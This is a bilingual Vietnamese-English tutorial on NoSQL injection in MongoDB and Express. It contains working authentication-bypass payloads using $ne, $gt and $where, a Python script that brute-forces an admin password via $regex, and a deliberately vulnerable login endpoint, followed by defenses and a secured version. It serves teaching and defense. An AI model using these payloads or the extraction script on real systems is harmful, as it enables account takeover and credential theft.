# NoSQL Injection

> **OWASP Top 10:2025**: A05 – Injection | **CWE**: CWE-943 | **Nguồn**: PortSwigger, HackTricks

## 🧱 Kiến thức Nền tảng

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra) lưu trữ dữ liệu theo dạng document, key-value, hoặc graph — khác với SQL databases truyền thống dùng bảng quan hệ. MongoDB là NoSQL database phổ biến nhất, sử dụng **BSON documents** và query language dựa trên JSON objects thay vì SQL strings.

Trong MongoDB, queries được xây dựng bằng **JSON/BSON objects** với các operator đặc biệt bắt đầu bằng `$`: `$eq` (equal), `$ne` (not equal), `$gt` (greater than), `$regex` (regular expression), `$where` (JavaScript execution).

```javascript
// Normal MongoDB query in Node.js with Mongoose
const mongoose = require('mongoose');

// Find a user by email - standard query
const user = await User.findOne({ email: "alice@example.com" });

// Query with comparison operators
const activeUsers = await User.find({
    status: "active",
    age: { $gte: 18 }      // Age greater than or equal to 18
});

// Authentication query - find user matching both email AND password
const authUser = await User.findOne({
    email: userEmail,
    password: hashedPassword
});
```

Nhiều developer tin rằng NoSQL databases "miễn nhiễm" với injection vì không dùng SQL strings. Đây là **quan niệm sai lầm nghiêm trọng** — NoSQL injection khai thác cơ chế khác: thay vì chèn SQL syntax, attacker chèn **query operators** vào JSON objects.

## 🔍 Mô tả lỗ hổng

NoSQL Injection xảy ra khi ứng dụng nhận user input và đưa trực tiếp vào MongoDB query mà không validate kiểu dữ liệu. Khi Express.js parse request body hoặc query string, nó có thể tự động chuyển đổi input thành **object** thay vì string, cho phép attacker chèn MongoDB operators.

Ví dụ: parameter `username[$ne]=` trong query string được Express parse thành `{ username: { $ne: "" } }` — biến một query tìm kiếm chính xác thành query tìm **tất cả documents** có username không rỗng.

## ⚔️ Cơ chế tấn công

### 1. Authentication Bypass

```javascript
// Vulnerable login endpoint
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,    // Directly from user input
        password: req.body.password     // Directly from user input
    });
    if (user) {
        res.json({ success: true, token: generateToken(user) });
    }
});
```

```http
# Attack: Send MongoDB operators instead of string values
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": {"$ne": ""},
    "password": {"$ne": ""}
}

# This query becomes: find user where username != "" AND password != ""
# Result: Returns the FIRST user in the database (usually admin)
```

```http
# Alternative: Using $gt operator
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": "admin",
    "password": {"$gt": ""}
}

# password > "" matches ANY non-empty password
# Result: Login as admin without knowing the password
```

### 2. Data Extraction with $regex

```http
# Extract admin password character by character
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$regex": "^a"}}     → 200 OK (starts with 'a')
{"username": "admin", "password": {"$regex": "^ab"}}    → 401 Fail
{"username": "admin", "password": {"$regex": "^a1"}}    → 200 OK (second char is '1')
{"username": "admin", "password": {"$regex": "^a1b"}}   → 200 OK
# Continue until full password is extracted: "a1b2c3d4..."
```

```python
# Automated extraction script
import requests
import string

url = "http://target.com/login"
password = ""
charset = string.ascii_lowercase + string.digits

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            password += c
            print(f"Found: {password}")
            found = True
            break
    if not found:
        print(f"Complete password: {password}")
        break
```

### 3. JavaScript Injection with $where

```http
# $where allows arbitrary JavaScript execution on the server
POST /api/users HTTP/1.1
Content-Type: application/json

{
    "username": {"$where": "sleep(5000) || true"}
}

# If response is delayed by 5 seconds, $where injection is confirmed

# Extract data via timing side-channel
{
    "username": {
        "$where": "if(this.password.charAt(0)=='a'){sleep(3000)}; return true"
    }
}
```

## 🛡️ Biện pháp phòng thủ

1. **Validate input types**: Ép kiểu user input thành `String()` trước khi dùng trong query.
2. **Dùng ODM built-in sanitization**: Mongoose schema với `type: String` tự động reject objects.
3. **Cấm `$where`**: Disable JavaScript execution trong MongoDB config.
4. **Dùng `mongo-sanitize`**: Thư viện strip tất cả keys bắt đầu bằng `$`.
5. **Parameterized queries**: Dùng Mongoose methods thay vì raw MongoDB driver queries.
6. **Rate limiting**: Ngăn chặn automated extraction attacks.

## 💻 Code Example

```javascript
// ❌ VULNERABLE: Direct user input in MongoDB query
const express = require('express');
const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
    // req.body.password could be {"$ne": ""} instead of a string
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password   // No type checking!
    });
    if (user) return res.json({ token: createJWT(user) });
    res.status(401).json({ error: "Invalid credentials" });
});
```

```javascript
// ✅ SECURE: Input validation and sanitization
const express = require('express');
const mongoSanitize = require('express-mongo-sanitize');
const app = express();

app.use(express.json());
app.use(mongoSanitize());  // Strip all keys starting with $ from req.body

app.post('/login', async (req, res) => {
    // Explicitly cast to string - objects become "[object Object]"
    const username = String(req.body.username);
    const password = String(req.body.password);

    // Validate input format before querying
    if (!username || !password || username.length > 64 || password.length > 128) {
        return res.status(400).json({ error: "Invalid input" });
    }

    // Use bcrypt comparison instead of DB-level password matching
    const user = await db.collection('users').findOne({ username });
    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
        return res.status(401).json({ error: "Invalid credentials" });
    }

    res.json({ token: createJWT(user) });
});
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/nosql-injection
- HackTricks – NoSQL Injection: https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
- CWE-943: https://cwe.mitre.org/data/definitions/943.html
- OWASP Testing Guide – NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
